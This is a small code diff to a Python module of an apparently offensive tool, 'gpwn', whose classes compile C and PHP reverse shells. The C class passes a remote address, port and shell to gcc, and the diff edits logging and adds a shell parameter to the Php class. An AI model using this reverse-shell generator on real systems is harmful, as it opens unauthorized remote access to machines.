@@ -5,7 +5,7 @@ from subprocess import Popen, PIPE, check_output
 from gpwn.resources import get_path
 from gpwn.exceptions import ShellError
 
-logger = logging.getLogger('root').getChild(__name__)
+logger = logging.getLogger().getChild(__name__)
 
 
 class Shell:
@@ -36,7 +36,7 @@ class C(Shell):
         pipe = Popen(
             ["gcc", path, "-o", "shell", "-DREMOTE_ADDR=%s" % address, "-DREMOTE_PORT=%s" % port, "-DSHELL=%s" % shell,
              "-Wno-implicit-function-declaration"])
-        logger.info(pipe.stdout)
+        logger.info("created reverse shell")
 
     def validate(self):
         if self.address is None:
@@ -46,5 +46,6 @@ class C(Shell):
 
 
 class Php(Shell):
-    def __init__(self, address: str, port: int):
+    def __init__(self, address: str, port: int, shell: str):
         Shell.__init__(self, address=address, port=port)
+        self.shell = shell
